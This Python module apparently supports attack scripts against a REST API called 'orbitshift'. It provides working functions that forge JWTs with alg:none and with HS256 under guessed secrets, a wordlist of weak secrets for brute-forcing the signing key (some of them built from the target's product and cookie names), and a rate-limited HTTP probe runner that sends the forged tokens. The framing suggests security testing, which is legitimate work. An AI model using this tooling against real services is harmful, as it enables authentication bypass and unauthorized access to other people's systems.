"""
REST + JWT shared helpers for the e1b / a4b attack cousins.

These modules attack REST APIs (orbitshift) rather than MCP servers, so they
don't fit the MCP-shaped ProbeEngine. This module provides the small set of
primitives both attacks need:

    - JWT decode / forge (alg:none, HS256 with arbitrary secret, kid override)
    - Top-100 weak-secret wordlist for HS256 bruteforce
    - Simple HTTP probe runner with rate limiting
    - REST-side ProbeResult dataclass that mirrors the verify_orbitshift_*.py shape
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Any

import httpx

# ── Status constants (match verify_orbitshift_a03 conventions) ──

PASS      = "PASS"
FAIL      = "FAIL"
SKIP      = "SKIP"
ERROR     = "ERROR"
AMBIGUOUS = "AMBIGUOUS"


@dataclass
class ProbeResult:
    probe_id: str
    status:   str
    title:    str
    expected: str
    actual:   str
    request_url: str = ""
    http_code:   int | None = None
    response:    str = ""
    evidence:    dict[str, Any] = field(default_factory=dict)
    notes:       str = ""

    def to_dict(self) -> dict:
        return {
            "probe_id":    self.probe_id,
            "status":      self.status,
            "title":       self.title,
            "expected":    self.expected,
            "actual":      self.actual,
            "request_url": self.request_url,
            "http_code":   self.http_code,
            "response":    self.response[:1024],
            "evidence":    self.evidence,
            "notes":       self.notes,
        }

    def __str__(self) -> str:
        icon = {PASS: "[PASS]", FAIL: "[FAIL]", SKIP: "[SKIP]",
                ERROR: "[ERR ]", AMBIGUOUS: "[AMBI]"}.get(self.status, "[?   ]")
        snippet = self.response[:240].replace("\n", " ")
        lines = [
            "",
            "-" * 72,
            f"  {icon} {self.probe_id} - {self.title}",
            "-" * 72,
            f"  URL      : {self.request_url}",
            f"  HTTP     : {self.http_code}",
            f"  Expected : {self.expected}",
            f"  Actual   : {self.actual}",
        ]
        if self.notes:
            lines.append(f"  Notes    : {self.notes}")
        if self.response:
            lines.append(f"  Response : {snippet}")
        return "\n".join(lines)


# ── JWT primitives ──

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def decode_jwt(jwt: str) -> tuple[dict, dict, str]:
    """Decode a compact JWT into (header, payload, signature_b64)."""
    parts = jwt.split(".")
    if len(parts) != 3:
        raise ValueError("Token does not look like a compact JWT")
    header  = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_jwt_alg_none(payload: dict, header_extra: dict | None = None) -> str:
    """Forge a JWT with alg:none (no signature)."""
    header = {"alg": "none", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h_b64 = _b64url(json.dumps(header,  separators=(",", ":")).encode())
    p_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    # Some servers accept missing sig; others want empty third segment.
    return f"{h_b64}.{p_b64}."


def forge_jwt_hs256(payload: dict, secret: str | bytes, header_extra: dict | None = None) -> str:
    """Forge a JWT signed with HS256 + given secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h_b64 = _b64url(json.dumps(header,  separators=(",", ":")).encode())
    p_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    sec_bytes = secret.encode() if isinstance(secret, str) else secret
    sig = hmac.new(sec_bytes, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url(sig)}"


def verify_hs256(jwt: str, secret: str | bytes) -> bool:
    """Return True iff the token's HS256 signature is valid under the given secret."""
    try:
        parts = jwt.split(".")
        if len(parts) != 3:
            return False
        sec_bytes = secret.encode() if isinstance(secret, str) else secret
        expected = hmac.new(sec_bytes, f"{parts[0]}.{parts[1]}".encode(),
                            hashlib.sha256).digest()
        return hmac.compare_digest(_b64url(expected), parts[2])
    except Exception:
        return False


# ── Top-100 weak-secret wordlist (curated, fast first-pass) ──
# Sources: jwt.io community list, CTF wordlists, OWASP cheat sheet, plus a
# handful of orbitshift-themed guesses (product-name patterns are common).

JWT_WEAK_SECRETS_TOP100: list[str] = [
    # universal
    "secret", "Secret", "SECRET", "supersecret", "secret123", "secretkey",
    "jwtsecret", "jwt_secret", "jwt-secret", "JWT_SECRET", "your-secret",
    "your-256-bit-secret", "your_secret_key", "your-secret-key",
    # passwords
    "password", "Password", "P@ssw0rd", "passw0rd", "password1", "password123",
    "12345", "123456", "1234567", "12345678", "123456789", "qwerty",
    "admin", "Admin", "administrator", "root", "toor", "test", "test123",
    # tokens
    "token", "tokenkey", "auth", "authkey", "apikey", "api-key", "api_key",
    # changeme
    "changeme", "CHANGE_ME", "default", "changethis", "changemenow",
    # frameworks / common defaults
    "express", "node", "nodejs", "django", "flask", "rails", "spring",
    "fastapi", "nestjs", "vercel", "next-auth", "next-auth-secret",
    "supabase", "supabase-secret",
    # encoding-related
    "base64secret", "abcdefghijklmnopqrstuvwxyz", "0123456789",
    "00000000", "11111111",
    # hashes that are also literal strings
    "deadbeef", "cafebabe", "facefeed",
    # short common keys
    "key", "Key", "mykey", "mysecret", "shhh", "shhhh",
    # orbitshift-themed guesses
    "orbitshift", "OrbitShift", "ORBITSHIFT", "orbitshift-secret",
    "orbitshift_jwt", "orbitshiftai", "orbitshift.ai", "orbitshift123",
    "orbitshift!", "orbit", "shift", "orbit-shift", "OrbitShiftJWT",
    "prodapi", "prod-api", "devapi", "dev-api", "os_PROD_session",
    "getorbitx", "getorbitx.com", "OrbitX", "orbitx",
    # session-cookie inspired (we saw os_PROD_session cookie name)
    "os-prod-session", "os_PROD", "os-PROD-session",
    # k8s / fastapi defaults
    "secret-key", "SECRET_KEY", "django-insecure",
    "very-secret", "very_secret", "topsecret", "TOP_SECRET",
    # last resort
    "", "null", "undefined", "None", "false",
]
# Trim to exactly 100 if needed; padding is fine
assert len(JWT_WEAK_SECRETS_TOP100) >= 100, "wordlist shrank — keep at least 100"


# ── HTTP probe runner ──

@dataclass
class HttpResponse:
    status: int | None
    text: str
    headers: dict
    error: str | None


def http_probe(client: httpx.Client, method: str, url: str,
               token: str | None = None,
               extra_headers: dict | None = None,
               json_body: dict | None = None,
               timeout: float = 15.0) -> HttpResponse:
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if extra_headers:
        headers.update(extra_headers)
    try:
        if method == "GET":
            r = client.get(url, headers=headers, timeout=timeout)
        elif method == "HEAD":
            r = client.head(url, headers=headers, timeout=timeout)
        elif method == "POST":
            r = client.post(url, headers=headers, json=json_body or {}, timeout=timeout)
        else:
            return HttpResponse(None, "", {}, f"unsupported method {method}")
        return HttpResponse(r.status_code, r.text, dict(r.headers), None)
    except Exception as exc:
        return HttpResponse(None, "", {}, str(exc))


class RateLimiter:
    """Token-bucket-ish: enforce a minimum interval between calls."""

    def __init__(self, rps: float) -> None:
        self.min_interval = 1.0 / rps if rps > 0 else 0.0
        self._last = 0.0

    def wait(self) -> None:
        if self.min_interval <= 0:
            return
        elapsed = time.time() - self._last
        if elapsed < self.min_interval:
            time.sleep(self.min_interval - elapsed)
        self._last = time.time()


# ── Standalone-runner support ──

def load_token_from_path(path: str) -> str:
    with open(path) as fh:
        return fh.read().strip()
